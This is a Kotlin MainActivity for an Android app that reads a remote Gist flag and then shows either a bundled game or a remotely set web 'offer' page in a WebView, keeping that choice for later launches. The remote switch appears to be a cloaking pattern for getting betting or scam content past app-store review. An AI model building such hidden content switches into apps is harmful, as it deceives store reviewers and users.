package com.vi.bt.online

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.lifecycle.withCreated
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.vi.bt.online.databinding.ActivityMainBinding
import com.vi.bt.online.util.*
import com.vi.bt.online.util.manager.DataStoreManager
import com.vi.bt.online.util.network.Gist
import com.vi.bt.online.util.network.GistData
import com.vi.bt.online.util.network.haveNetworkConnection
import com.vi.bt.online.webView.webViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutineMain = CoroutineScope(Dispatchers.Main)



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${haveNetworkConnection()}")
        if (haveNetworkConnection().not()) lottie.showNotNetwork()
        else {
            lottie.showLoader()
            checkDataStore()

            coroutineMain.launch(Dispatchers.Main) {
                startFragmentIdFlow.collect { fragmentId ->
                    requestedOrientation = when (fragmentId) {
                        R.id.gameFragment    -> {
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.lottieLoader.id, .3f)
                                }.applyTo(rootCL)
                            }
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        R.id.webViewFragment -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }
                    setStartDestination(fragmentId)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutineMain)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun checkDataStore() {
        coroutineMain.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Web" -> {
                    log("DataStoreManager Key = Web")
                    DataStoreManager.Link.get()?.let {
                        GistData.url = it
                        startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                        OneSignalUtil.initialize()
                    }
                }
                "Game" -> {
                    log("DataStoreManager Key = Game")
                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    initServices()
                    getGistData()
                }
            }
        }
    }

    private fun initServices() {
        AppsflyerUtil.initialize(this)
        OneSignalUtil.initialize()
    }

    private suspend fun getGistData() {
        try {
            Gist.getGistJSON().also { data ->
                GistData.apply {
                    url     = data.getString("url")
                    isOffer = data.getString("stav").contains("true")

                    withContext(Dispatchers.IO) {
                        if (isOffer!!) {
                            DataStoreManager.Key.update { "Web" }
                            DataStoreManager.Link.update { url!! }
                            R.id.webViewFragment
                        } else {
                            DataStoreManager.Key.update { "Game" }
                            R.id.gameFragment
                        }.also { startFragmentIdFlow.tryEmit(it) }
                    }

                    log("""
                        
                        getGistData:
                        url     = $url
                        isOffer = $isOffer
                        """)
                }
            }
        } catch (e: Exception) {
            log("getGistData error: ${e.message}")
        }
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }
}